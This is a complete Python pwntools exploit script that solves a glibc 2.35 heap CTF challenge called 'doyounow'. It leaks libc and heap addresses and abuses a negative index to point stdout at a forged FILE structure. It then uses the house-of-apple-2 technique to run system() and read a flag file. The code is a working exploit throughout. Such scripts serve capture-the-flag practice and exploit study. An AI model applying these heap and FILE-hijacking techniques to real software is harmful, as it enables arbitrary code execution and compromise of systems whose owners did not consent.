#!/usr/bin/env ctf-python
"""doyounow - glibc 2.35 heap pwn (MetaCTF Flash, Oct 2026).

Leaks libc and heap, points stdout at a fake FILE, then house-of-apple-2 to system()."""
# Run it three ways:
#   CTF_LOCAL=1 ctf-python solve/solve.py     -> local sandbox service (127.0.0.1:31337)
#   ctf-python solve/solve.py                 -> recorded remote (TLS)
#   CTF_TARGET='nc host 1337' ctf-python solve/solve.py

import os
import pathlib
import sys

_here = pathlib.Path(__file__).resolve()
for _p in _here.parents:
    if (_p / "lib" / "ctf.py").is_file():
        sys.path.insert(0, str(_p / "lib"))
        break

import ctf  # noqa: E402
from pwn import *  # noqa: E402,F403

context.clear(arch="amd64", os="linux")
context.log_level = os.environ.get("LOGLEVEL", "info")

LOCAL_PORT = int(os.environ.get("LOCAL_PORT", "31337"))

# libc offsets for GLIBC 2.35-0ubuntu3.13 (extracted from the ubuntu:22.04 image).
MAIN_ARENA = 0x21AC80          # &main_arena ; unsorted-bin fd leak = base+MAIN_ARENA+0x60
OFF_SYSTEM = 0x50D70
OFF_WFILE_JUMPS = 0x2170C0
OFF_STR_JUMPS = 0x217240       # __xsputn == _IO_default_xsputn (benign stage-1)

# deterministic heap offset of the fake-FILE chunk for our allocation order
F_OFF_IN_HEAP = 0xE80

FSIZE = 0x300                  # request size for the fake-FILE chunk (chunk 0x310, tcache)


def get_io():
    if os.environ.get("CTF_LOCAL"):
        return remote("127.0.0.1", LOCAL_PORT)
    if os.environ.get("CTF_TARGET"):
        t = ctf.target()
        return remote(t["host"], t["port"], ssl=t.get("ssl", False))
    t = ctf.target()
    # remote service is a raw TLS socket
    return remote(t["host"], t["port"], ssl=True)


def num(n):
    return str(n).encode().ljust(4, b"\x00")[:4]


def exploit(io):
    def menu_choice(c):
        io.recvuntil(b">>")
        io.send(num(c))

    def add(idx, size):
        menu_choice(1)
        io.recvuntil(b">>")   # Index:
        io.send(num(idx))
        io.recvuntil(b">>")   # Size:
        io.send(num(size))
        io.recvuntil(b"added!")

    def delete(idx):
        menu_choice(2)
        io.recvuntil(b">>")
        io.send(num(idx))
        io.recvuntil(b"deleted!")

    def edit(idx, data):
        menu_choice(3)
        io.recvuntil(b">>")
        io.send(num(idx))
        io.send(data)
        io.recvuntil(b"edited!")

    def show(idx):
        menu_choice(4)
        io.recvuntil(b">>")
        io.send(num(idx))
        io.recvuntil(b"Nanja koriya!!!\n")
        return io.recvline()

    # --- 1. libc leak via unsorted bin ---
    add(0, 1500)
    add(1, 1500)   # guard against top consolidation
    delete(0)      # -> unsorted bin, fd=bk=main_arena+0x60
    add(2, 1500)   # exact-fit reuse keeps fd/bk in user data
    leak = u64(show(2).rstrip(b"\n").ljust(8, b"\x00"))
    libc = leak - 0x60 - MAIN_ARENA
    log.info("main_arena+0x60 leak = %#x", leak)
    log.info("libc base            = %#x", libc)
    assert libc & 0xFFF == 0, "bad libc leak"

    system = libc + OFF_SYSTEM
    wfile_jumps = libc + OFF_WFILE_JUMPS
    str_jumps = libc + OFF_STR_JUMPS

    # --- 2. heap leak (safe-linked fd of a tcache chunk) ---
    add(3, FSIZE)
    delete(3)
    add(4, FSIZE)                       # Notes[4] = F ; F's fd (offset 0) = F>>12
    heap_raw = u64(show(4).rstrip(b"\n").ljust(8, b"\x00"))
    heap = heap_raw << 12
    F = heap + F_OFF_IN_HEAP
    log.info("heap base            = %#x", heap)
    log.info("fake FILE chunk F    = %#x", F)

    # --- 3. stage-1 benign FILE: survives one flush with clobbered _flags ---
    W = F + 0x100          # scratch write buffer inside F's chunk (unused by struct)
    stage1 = bytearray(FSIZE)

    def p(buf, off, val):
        buf[off:off + 8] = p64(val)

    p(stage1, 0x20, W)             # _IO_write_base
    p(stage1, 0x28, W)             # _IO_write_ptr
    p(stage1, 0x30, F + 0x240)     # _IO_write_end (room 0x140 for menu output)
    p(stage1, 0x88, F + 0x280)     # _lock -> zeroed qword outside the scratch buffer
    # _mode (0xc0) stays 0 so _IO_fwide forces narrow and puts() calls __xsputn
    p(stage1, 0xD8, str_jumps)     # vtable -> __xsputn == _IO_default_xsputn (pure memcpy)

    edit(4, bytes(stage1))
    delete(4)                      # F -> tcache with stage-1 content (first 16B get clobbered)

    # --- 4. redirect stdout to F ---
    # add writes F into the stdout global (Notes[-6].chunk), then output is swallowed, so go blind.
    io.recvuntil(b">>")            # menu prompt
    io.send(num(1))
    io.recvuntil(b">>")            # Index:
    io.send(num(-6))
    io.recvuntil(b">>")            # Size:
    io.send(num(FSIZE))            # malloc(FSIZE) -> F ; stdout now = F ; puts("added!") swallowed

    # --- 5. stage-2 house-of-apple-2 FILE, written blind via edit(-6) ---
    A = F + 0x100                  # fake _IO_wide_data
    B = F + 0x198                  # fake wide vtable so B+0x68 == &system qword
    cmd = b" cat /app/flag.txt;cat flag.txt 2>/dev/null\x00"
    stage2 = bytearray(FSIZE)
    stage2[0:len(cmd)] = cmd       # _flags region = command string for system(F)
    p(stage2, 0x88, F + 0x280)     # _lock -> zero
    p(stage2, 0xA0, A)             # _wide_data
    # _mode (0xc0) = 0
    p(stage2, 0xD8, wfile_jumps)   # vtable (legit, passes validation)
    p(stage2, 0x100 + 0x18, 0)     # A->_IO_write_base = NULL -> enters _IO_wdoallocbuf
    p(stage2, 0x100 + 0x20, 0)     # A->_IO_write_ptr
    p(stage2, 0x100 + 0x28, 0)     # A->_IO_write_end
    p(stage2, 0x100 + 0x30, 0)     # A->_IO_buf_base = NULL
    p(stage2, 0x100 + 0xE0, B)     # A->_wide_vtable
    p(stage2, 0x200, system)       # (B+0x68)->__doallocate = system
    # F+0x280 stays 0 (the lock)

    # blind edit(-6): menu 3, index -6, then FSIZE bytes
    io.send(num(3))
    io.send(num(-6))
    io.send(bytes(stage2))
    # puts("edited!") now flushes through the malicious FILE -> system(" cat /app/flag.txt")

    out = b""
    try:
        out = io.recvrepeat(3)
    except EOFError:
        pass
    return out


def main():
    io = get_io()
    out = exploit(io)
    sys.stdout.buffer.write(out)
    sys.stdout.flush()
    ctf.win(out, slug="doyounow")
    try:
        io.close()
    except Exception:
        pass


if __name__ == "__main__":
    main()
